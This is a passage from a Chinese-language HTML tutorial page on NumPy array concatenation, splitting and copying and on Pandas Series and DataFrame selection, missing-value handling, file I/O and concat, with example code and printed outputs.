class="string">'''</span></span><br><span class="line"><span class="comment"># 列合并</span></span><br><span class="line">D = np.concatenate((A,B,B,A),axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(D)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">array([[1, 2, 2, 1],</span></span><br><span class="line"><span class="string">       [1, 2, 2, 1],</span></span><br><span class="line"><span class="string">       [1, 2, 2, 1]])</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h3 id="矩阵分割"><a href="#矩阵分割" class="headerlink" title="矩阵分割"></a>矩阵分割</h3><h4 id="纵向和横向分割"><a href="#纵向和横向分割" class="headerlink" title="纵向和横向分割"></a>纵向和横向分割</h4><p>此方法如果不是均等分割会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">A=np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[ 0  1  2  3]</span></span><br><span class="line"><span class="string"> [ 4  5  6  7]</span></span><br><span class="line"><span class="string"> [ 8  9 10 11]]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 按列等间隔分割</span></span><br><span class="line">print(np.split(A,<span class="number">2</span>,axis=<span class="number">1</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[array([[0, 1],</span></span><br><span class="line"><span class="string">       [4, 5],</span></span><br><span class="line"><span class="string">       [8, 9]]), array([[ 2,  3],</span></span><br><span class="line"><span class="string">       [ 6,  7],</span></span><br><span class="line"><span class="string">       [10, 11]])]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 按行等间隔分割</span></span><br><span class="line">print(np.split(A, <span class="number">3</span>, axis=<span class="number">0</span>))</span><br><span class="line"><span class="comment"># [array([[0, 1, 2, 3]]), array([[4, 5, 6, 7]]), array([[ 8,  9, 10, 11]])]</span></span><br></pre></td></tr></table></figure><h4 id="不等量的分割"><a href="#不等量的分割" class="headerlink" title="不等量的分割"></a>不等量的分割</h4><p>不等量分割计算：假如按列分四组，列元素有6个，每组可分6/4=1个元素。多了的元素处理：6%4为2，前2行分+1个元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">A=np.arange(<span class="number">12</span>).reshape(<span class="number">2</span>,<span class="number">6</span>)</span><br><span class="line">print(A)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[ 0  1  2  3  4  5]</span></span><br><span class="line"><span class="string"> [ 6  7  8  9 10 11]]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">print(np.array_split(A, <span class="number">4</span>, axis=<span class="number">1</span>))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[array([[0, 1],</span></span><br><span class="line"><span class="string">       [6, 7]]), array([[2, 3],</span></span><br><span class="line"><span class="string">       [8, 9]]), array([[ 4],</span></span><br><span class="line"><span class="string">       [10]]), array([[ 5],</span></span><br><span class="line"><span class="string">       [11]])]</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>在Numpy里还有<code>np.vsplit()</code>与横<code>np.hsplit()</code>方式可用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(np.vsplit(A, <span class="number">3</span>)) <span class="comment">#等于 print(np.split(A, 3, axis=0))</span></span><br><span class="line">print(np.hsplit(A, <span class="number">2</span>)) <span class="comment">#等于 print(np.split(A, 2, axis=1))</span></span><br></pre></td></tr></table></figure><h3 id="Numpy的浅拷贝和深拷贝（copy）"><a href="#Numpy的浅拷贝和深拷贝（copy）" class="headerlink" title="Numpy的浅拷贝和深拷贝（copy）"></a>Numpy的浅拷贝和深拷贝（copy）</h3><p>等号赋值会有关联性，相当于起引用起别名，原数据改变会引起关联变量值改变。而copy() 的赋值方式没有关联性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b = a.copy()    <span class="comment"># deep copy</span></span><br><span class="line"><span class="comment"># 此时a与b已经没有关联。</span></span><br></pre></td></tr></table></figure><h2 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h2><h3 id="官方文档（2021-4-20）"><a href="#官方文档（2021-4-20）" class="headerlink" title="官方文档（2021-4-20）"></a>官方文档（2021-4-20）</h3><p><a href="https://pandas.pydata.org/pandas-docs/stable/reference/frame.html" target="_blank" rel="noopener">https://pandas.pydata.org/pandas-docs/stable/reference/frame.html</a></p><p>Numpy 是列表形式的，没有数值标签，而 Pandas 就是字典形式。Pandas是基于Numpy构建的，让Numpy为中心的应用变得更加简单。</p><h3 id="Series"><a href="#Series" class="headerlink" title="Series"></a>Series</h3><p><code>Series</code>的字符串表现形式为：索引在左边，值在右边。由于我们没有为数据指定索引。于是会自动创建一个0到N-1（N为长度）的整数型索引。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># 如果定义的index在原字典中已经存在，那么该索引会一直对应原字典的值，如果index对应不到原字典的值，则会返回NaN</span></span><br><span class="line"></span><br><span class="line">a=pd.Series(&#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">3</span>&#125;,index = [<span class="string">'b'</span>,<span class="string">'a'</span>,<span class="string">'c'</span>])</span><br><span class="line">print(a)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b    3.0</span></span><br><span class="line"><span class="string">a    1.0</span></span><br><span class="line"><span class="string">c    NaN</span></span><br><span class="line"><span class="string">dtype: float64</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 索引不指定会自动创建</span></span><br><span class="line">a=pd.Series([<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,np.nan,<span class="number">44</span>,<span class="number">1</span>])</span><br><span class="line">print(a)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0     1.0</span></span><br><span class="line"><span class="string">1     3.0</span></span><br><span class="line"><span class="string">2     6.0</span></span><br><span class="line"><span class="string">3     NaN</span></span><br><span class="line"><span class="string">4    44.0</span></span><br><span class="line"><span class="string">5     1.0</span></span><br><span class="line"><span class="string">dtype: float64</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="DataFrame"><a href="#DataFrame" class="headerlink" title="DataFrame"></a>DataFrame</h3><p><code>DataFrame</code>是一个表格型的数据结构，它包含有一组有序的列，每列可以是不同的值类型（数值，字符串，布尔值等）。<code>DataFrame</code>既有行索引也有列索引， 它可以被看做由<code>Series</code>组成的大字典。没有给定行标签和列标签的数据，会采取默认的从0开始 index。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">dates = pd.date_range(<span class="string">'20160101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">6</span>,<span class="number">4</span>),index=dates,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">print(df)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">                   a         b         c         d</span></span><br><span class="line"><span class="string">2016-01-01 -0.253065 -2.071051 -0.640515  0.613663</span></span><br><span class="line"><span class="string">2016-01-02 -1.147178  1.532470  0.989255 -0.499761</span></span><br><span class="line"><span class="string">2016-01-03  1.221656 -2.390171  1.862914  0.778070</span></span><br><span class="line"><span class="string">2016-01-04  1.473877 -0.046419  0.610046  0.204672</span></span><br><span class="line"><span class="string">2016-01-05 -1.584752 -0.700592  1.487264 -1.778293</span></span><br><span class="line"><span class="string">2016-01-06  0.633675 -1.414157 -0.277066 -0.442545</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h4 id="常用属性查看"><a href="#常用属性查看" class="headerlink" title="常用属性查看"></a>常用属性查看</h4><ul><li><code>dtype</code>查看数据类型</li><li><code>index</code>查看列的序号</li><li><code>columns</code>查看数据行的名称</li><li><code>values</code>查看值</li><li><code>describe</code>查看总的描述</li></ul><h4 id="数据排序"><a href="#数据排序" class="headerlink" title="数据排序"></a>数据排序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按index排序</span></span><br><span class="line">print(df.sort_index(axis=<span class="number">1</span>,ascending=<span class="keyword">False</span>))</span><br><span class="line"><span class="comment"># 按values排序</span></span><br><span class="line">print(df2.sort_values(by=<span class="string">'列名'</span>))</span><br></pre></td></tr></table></figure><h4 id="数据选择"><a href="#数据选择" class="headerlink" title="数据选择"></a>数据选择</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">dates = pd.date_range(<span class="string">'20160101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">6</span>,<span class="number">4</span>),index=dates,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">               a         b         c         d</span></span><br><span class="line"><span class="string">2016-01-01 -0.482295 -0.474567  0.066334 -0.111646</span></span><br><span class="line"><span class="string">2016-01-02 -1.359595  1.895219 -0.035587 -0.049728</span></span><br><span class="line"><span class="string">2016-01-03  0.746566  0.439931  0.118921 -0.183519</span></span><br><span class="line"><span class="string">2016-01-04 -1.468278  1.530795 -0.864718 -0.489982</span></span><br><span class="line"><span class="string">2016-01-05  0.461041  0.985116  1.614093 -0.635298</span></span><br><span class="line"><span class="string">2016-01-06  0.097487 -0.082434 -0.917420  0.793434</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">print(df[<span class="string">'a'</span>])<span class="comment">#其余筛选与python数组截取类似</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">2016-01-01   -0.482295</span></span><br><span class="line"><span class="string">2016-01-02   -1.359595</span></span><br><span class="line"><span class="string">2016-01-03    0.746566</span></span><br><span class="line"><span class="string">2016-01-04   -1.468278</span></span><br><span class="line"><span class="string">2016-01-05    0.461041</span></span><br><span class="line"><span class="string">2016-01-06    0.097487</span></span><br><span class="line"><span class="string">Freq: D, Name: a, dtype: float64</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 跨列和跨行</span></span><br><span class="line">print(df[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">print(df[<span class="string">'2016-01-01 '</span>:<span class="string">'2016-01-06'</span>])</span><br></pre></td></tr></table></figure><h5 id="根据标签-loc"><a href="#根据标签-loc" class="headerlink" title="根据标签 loc"></a>根据标签 loc</h5><p>我们可以使用标签来选择数据 <code>loc</code>, 本例子主要通过标签名字选择某一行数据， 或者通过选择某行或者所有行（<code>:</code>代表所有行）然后选其中某一列或几列数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其中几行</span></span><br><span class="line">print(df.loc[<span class="string">'2016-01-04'</span>:<span class="string">'2016-01-06'</span>])</span><br><span class="line"><span class="comment"># 其中几列</span></span><br><span class="line">print(df.loc[:,[<span class="string">'a'</span>,<span class="string">'b'</span>]])</span><br></pre></td></tr></table></figure><h5 id="根据序列-iloc"><a href="#根据序列-iloc" class="headerlink" title="根据序列 iloc"></a>根据序列 iloc</h5><p>另外我们可以采用位置进行选择 <code>iloc</code>, 在这里我们可以通过位置选择在不同情况下所需要的数据例如选某一个，连续选或者跨行选等操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">print(df.iloc[<span class="number">3</span>:<span class="number">5</span>,<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">                   b         c</span></span><br><span class="line"><span class="string">2016-01-04 -0.409077 -0.485776</span></span><br><span class="line"><span class="string">2016-01-05 -0.231562  1.317709</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(df.iloc[[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>],<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">                   b         c</span></span><br><span class="line"><span class="string">2016-01-02  1.573411 -0.335548</span></span><br><span class="line"><span class="string">2016-01-04 -0.409077 -0.485776</span></span><br><span class="line"><span class="string">2016-01-06  0.359269 -0.271838</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>当然我们可以采用混合选择 <code>ix</code>, 其中选择’A’和’C’的两列，并选择前三行的数据。<strong>已经不建议使用</strong></p><h5 id="通过判断的筛选"><a href="#通过判断的筛选" class="headerlink" title="通过判断的筛选"></a>通过判断的筛选</h5><p>我们可以采用判断指令 (Boolean indexing) 进行选择. 我们可以约束某项条件然后选择出当前所有数据.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(df.a&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="值的设置"><a href="#值的设置" class="headerlink" title="值的设置"></a>值的设置</h4><h5 id="根据位置设置-loc-和-iloc"><a href="#根据位置设置-loc-和-iloc" class="headerlink" title="根据位置设置 loc 和 iloc"></a>根据位置设置 loc 和 iloc</h5><p>可以利用索引或者标签确定需要修改值的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df.iloc[<span class="number">2</span>,<span class="number">2</span>] = <span class="number">1111</span></span><br><span class="line">df.loc[<span class="string">'2016-01-05'</span>,<span class="string">'a'</span>] = <span class="number">2222</span></span><br></pre></td></tr></table></figure><h5 id="根据条件设置"><a href="#根据条件设置" class="headerlink" title="根据条件设置"></a>根据条件设置</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.b[df.a&gt;<span class="number">0</span>] = <span class="number">0</span></span><br></pre></td></tr></table></figure><h5 id="按行或列设置"><a href="#按行或列设置" class="headerlink" title="按行或列设置"></a>按行或列设置</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 整列操作</span></span><br><span class="line">df[<span class="string">'a'</span>] = np.nan</span><br></pre></td></tr></table></figure><h5 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'e'</span>] = pd.Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], index=pd.date_range(<span class="string">'2016-01-01'</span>,periods=<span class="number">6</span>))</span><br></pre></td></tr></table></figure><h4 id="处理丢失数据"><a href="#处理丢失数据" class="headerlink" title="处理丢失数据"></a>处理丢失数据</h4><h5 id="去掉有-NaN-的行或列-dropna"><a href="#去掉有-NaN-的行或列-dropna" class="headerlink" title="去掉有 NaN 的行或列(dropna)"></a>去掉有 <code>NaN</code> 的行或列(dropna)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>, periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates, columns=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line">df.iloc[<span class="number">0</span>,<span class="number">1</span>] = np.nan</span><br><span class="line">df.iloc[<span class="number">1</span>,<span class="number">2</span>] = np.nan</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">             A     B     C   D</span></span><br><span class="line"><span class="string">2013-01-01   0   NaN   2.0   3</span></span><br><span class="line"><span class="string">2013-01-02   4   5.0   NaN   7</span></span><br><span class="line"><span class="string">2013-01-03   8   9.0  10.0  11</span></span><br><span class="line"><span class="string">2013-01-04  12  13.0  14.0  15</span></span><br><span class="line"><span class="string">2013-01-05  16  17.0  18.0  19</span></span><br><span class="line"><span class="string">2013-01-06  20  21.0  22.0  23</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">df.dropna(</span><br><span class="line">    axis=<span class="number">0</span>,     <span class="comment"># 0: 对行进行操作; 1: 对列进行操作</span></span><br><span class="line">    how=<span class="string">'any'</span>   <span class="comment"># 'any': 只要存在 NaN 就 drop 掉; 'all': 必须全部是 NaN 才 drop</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h5 id="用其他值代替-fillna"><a href="#用其他值代替-fillna" class="headerlink" title="用其他值代替(fillna)"></a>用其他值代替(fillna)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.fillna(value=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h5 id="判断有无缺失（isnull）"><a href="#判断有无缺失（isnull）" class="headerlink" title="判断有无缺失（isnull）"></a>判断有无缺失（isnull）</h5><p>判断是否有缺失数据 <code>NaN</code>, 为 <code>True</code> 表示缺失数据。</p><p>检测在数据中是否存在 <code>NaN</code>, 如果存在就返回 <code>True</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(df.isnull())</span><br><span class="line">print(np.any(df.isnull()) == <span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h4 id="导入导出"><a href="#导入导出" class="headerlink" title="导入导出"></a>导入导出</h4><p><code>pandas</code>可以读取与存取的资料格式有很多种，像<code>csv</code>、<code>excel</code>、<code>json</code>、<code>html</code>与<code>pickle</code>等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取csv</span></span><br><span class="line">data = pd.read_csv(<span class="string">'student.csv'</span>)</span><br><span class="line"><span class="comment"># 将资料存取成pickle</span></span><br><span class="line">data.to_pickle(<span class="string">'student.pickle'</span>)</span><br></pre></td></tr></table></figure><h4 id="合并-concat"><a href="#合并-concat" class="headerlink" title="合并( concat)"></a>合并( concat)</h4><h5 id="合并方向-axis"><a href="#合并方向-axis" class="headerlink" title="合并方向(axis)"></a>合并方向(axis)</h5><p><code>axis=0</code>是预设值，因此未设定任何参数时，函数默认<code>axis=0</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义资料集</span></span><br><span class="line">df1 = pd.DataFrame(np.ones((<span class="number">3</span>,<span class="number">4</span>))*<span class="number">0</span>, columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">df2 = pd.DataFrame(np.ones((<span class="number">3</span>,<span class="number">4</span>))*<span class="number">1</span>, columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">df3 = pd.DataFrame(np.ones((<span class="number">3</span>,<span class="number">4</span>))*<span class="number">2</span>, columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#concat纵向合并</span></span><br><span class="line">res = pd.concat([df1, df2, df3], axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印结果</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     a    b    c    d</span></span><br><span class="line"><span class="comment"># 0  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 0  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 1  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 2  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 0  2.0  2.0  2.0  2.0</span></span><br><span class="line"><span class="comment"># 1  2.0  2.0  2.0  2.0</span></span><br><span class="line"><span class="comment"># 2  2.0  2.0  2.0  2.0</span></span><br></pre></td></tr></table></figure><h5 id="重置-index-ignore-index"><a href="#重置-index-ignore-index" class="headerlink" title="重置 index(ignore_index)"></a>重置 index(ignore_index)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = pd.concat([df1, df2, df3], axis=<span class="number">0</span>, ignore_index=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>结果的<code>index</code>变0, 1, 2, 3, 4, 5, 6, 7, 8。</p><h5 id="join-合并方式"><a href="#join-合并方式" class="headerlink" title="join 合并方式"></a>join 合并方式</h5><p><code>join=&#39;outer&#39;</code>为预设值，因此未设定任何参数时，函数默认<code>join=&#39;outer&#39;</code>。此方式是依照<code>column</code>来做纵向合并，有相同的<code>column</code>上下合并在一起，其他独自的<code>column</code>个自成列，原本没有值的位置皆以<code>NaN</code>填充。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义资料集</span></span><br><span class="line">df1 = pd.DataFrame(np.ones((<span class="number">3</span>,<span class="number">4</span>))*<span class="number">0</span>, columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>], index=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">df2 = pd.DataFrame(np.ones((<span class="number">3</span>,<span class="number">4</span>))*<span class="number">1</span>, columns=[<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>], index=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#纵向"外"合并df1与df2</span></span><br><span class="line">res = pd.concat([df1, df2], axis=<span class="number">0</span>, join=<span class="string">'outer'</span>)</span><br><span class="line"></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     a    b    c    d    e</span></span><br><span class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0  NaN</span></span><br><span class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0  NaN</span></span><br><span class="line"><span class="comment"># 3  0.0  0.0  0.0  0.0  NaN</span></span><br><span class="line"><span class="comment"># 2  NaN  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 3  NaN  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 4  NaN  1.0  1.0  1.0  1.0</span></span><br></pre></td></tr></table></figure><p>inner内合并</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#纵向"内"合并df1与df2</span></span><br><span class="line">res = pd.concat([df1, df2], axis=<span class="number">0</span>, join=<span class="string">'inner'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印结果</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     b    c    d</span></span><br><span class="line"><span class="comment"># 1  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 2  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 3  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 2  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 3  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 4  1.0  1.0  1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重置index并打印结果</span></span><br><span class="line">res = pd.concat([df1, df2], axis=<span class="number">0</span>, join=<span class="string">'inner'</span>, ignore_index=<span class="keyword">True</span>)</span><br><span 